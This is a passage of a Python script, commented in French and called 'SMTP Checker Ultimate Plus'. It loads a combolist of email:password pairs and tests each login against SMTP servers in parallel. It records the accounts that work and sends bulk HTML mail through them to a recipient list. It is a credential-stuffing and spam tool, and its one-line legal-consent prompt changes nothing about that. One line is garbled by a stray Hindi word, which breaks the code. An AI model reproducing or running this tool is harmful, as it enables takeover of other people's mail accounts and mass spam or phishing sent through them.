                f.write(f"{email}:{password}:{message}\n")
    return sent_count

def load_recipients(recipient_file: str) -> List[str]:
    """Charge et valide la liste des destinataires."""
    recipients = []
    try:
        with open(recipient_file, 'r', encoding='utf-8') as file:
            for line in file:
                recipient = line.strip()
                if recipient and is_valid_email(recipient):
                    recipients.append(recipient)
                else:
                    print(f"{Fore.YELLOW}⚠️ Destinataire invalide ignoré: {recipient}{Style.RESET_ALL}")
                    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Destinataire invalide ignoré: {recipient}\n")
        return recipients
    except FileNotFoundError:
        print(f"{Fore.RED}❌ Fichier {recipient_file} non trouvé{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fichier {recipient_file} non trouvé\n")
        return []
    except Exception as e:
        print(f"{Fore.RED}❌ Erreur lors du chargement des destinataires: {str(e)}{Style.RESET_ALL}")
        return []

def get_optimal_threads(combo_count: int) -> int:
    """Calcule le nombre optimal de threads en fonction des ressources."""
    cpu_count = psutil.cpu_count()
    memory = psutil.virtual_memory().percent
    return min(10, max(1, cpu_count - 1 if memory < 80 else cpu_count // 2))

def legal_warning():
    """Affiche un avertissement légal."""
    print(f"{Fore.RED}⚠️ AVERTISSEMENT : L'envoi d'emails non sollicités est illégal. Assurez-vous d'avoir le consentement des destinataires.{Style.RESET_ALL}")
    if input("Confirmez-vous que vous avez le consentement des destinataires ? (oui/non) : ").lower() != 'oui':
        sys.exit("Script arrêté pour des raisons légales.")

def process_combolist(combo_file: str, test_email: str, sender_name: str, subject: str, html_content: str, recipient_file: str, max_workers: int = 10):
    """Traite la combolist avec multithreading."""
    legal_warning()
    recipients = load_recipients(recipient_file)
    if not recipients:
        print(f"{Fore.RED}❌ Aucun destinataire valide. Arrêt du script.{Style.RESET_ALL}")
        return
    
    sent_recipients: Set[str] = set()
    stats = {'valid_smtps': 0, 'failed_smtps': 0, 'emails_sent': 0, 'invalid_emails': 0, 'invalid_passwords': 0}
    
    try:
        combos = []
        with open(combo_file, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                combos.append((email, password))
        
        max_workers = min(max_workers, get_optimal_threads(len(combos)))
        print(f"{Fore.CYAN}ℹ Utilisation de {max_workers} threads pour {len(combos)} combinaisons{Style.RESET_ALL}")
        
        results_lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(process_combo, email, password, test_email, sender_name, subject, html_content, recipients, sent_recipients, results_lock, stats)
                for email, password in combos
            ]
            for future in tqdm(as_completed(futures), total=len(futures), desc="Traitement des combinaisons"):
                sent_count = future.result()
                clear_expired_cache()
                remaining = len(recipients) - len(sent_recipients)
                if remaining <= 0:
                    print(f"{Fore.GREEN}✅ Tous les destinataires ({len(recipients)}) ont reçu un email. Arrêt du traitement.{Style.RESET_ALL}")
                    break
                print(f"{Fore.CYAN}ℹ {remaining} destinataires restants à contacter{Style.RESET_ALL}")
                
        print(f"{Fore.GREEN}✅ Résumé : {stats['valid_smtps']} SMTP valides, {stats['failed_smtps']} échecs, {stats['emails_sent']} emails envoyés, {stats['invalid_emails']} emails invalides, {stats['invalid_passwords']} mots de passe invalides{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Résumé : {stats}\n")
                
    except FileNotFoundError:
        print(f"{Fore.RED}❌ Fichier {combo_file} non trouvé{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fichier {combo_file} non trouvé\n")
    except Exception as e:
        print(f"{Fore.RED}❌ Erreur lors du traitement du fichier: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Erreur traitement fichier: {str(e)}\n")

def main():
    print(f"{Fore.CYAN}ℹ SMTP Checker Ultimate Plus - Version améliorée{Style.RESET_ALL}")
    combo_file = input("Entrez le chemin du fichier combolist (mail:pass): ")
    recipient_file = input("Entrez le chemin du fichier des destinataires: ")
    test_email = input("Entrez l'email de destination pour le test SMTP: ")
    if not is_valid_email(test_email):
        print(f"{Fore.RED}❌ Email de destination invalide. Arrêt du script.{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email de destination invalide: {test_email}\n")
        return
    sender_name = input("Entrez le nom de l’expéditeur (ex. John Doe): ")
    subject = input("Entrez le sujet de l’email: ")
    
    print("\nEntrez le contenu HTML (laissez vide pour le modèle par défaut, entrez 'EOF' sur une ligne seule pour terminer):")
    html_lines = []
    default_html = """
<html>
<body>
    <h1>Test Email</h1>
    <p>Ceci est un email de test envoyé par le script SMTP checker.</p>
</body>
</html>
"""
    while True:
        line = input()
        if line == 'EOF':
            break
        html_lines.append(line)
    
    html_content = '\n'.join(html_lines).strip()
    if not html_content or html_content.lower().find('<html') == -1:
        print(f"{Fore.YELLOW}⚠️ Contenu HTML invalide ou vide. Utilisation du modèle par défaut.{Style.RESET_ALL}")
        html_content = default_html
    else:
 अगर html_content = html_content
    
    max_workers = int(input("Entrez le nombre de threads (max 10, par défaut 10): ") or 10)
    print(f"{Fore.CYAN}ℹ Début du traitement de {combo_file} avec {len(load_recipients(recipient_file))} destinataires{Style.RESET_ALL}")
    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Début traitement: {combo_file}, test_email: {test_email}, destinataires: {recipient_file}, threads: {max_workers}\n")
    
    process_combolist(combo_file, test_email, sender_name, subject, html_content, recipient_file, max_workers)
    print(f"{Fore.GREEN}✅ Traitement terminé. Résultats dans 'smtp_valid.txt', erreurs dans 'smtp_errors.txt', logs dans 'smtp_log.txt'.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()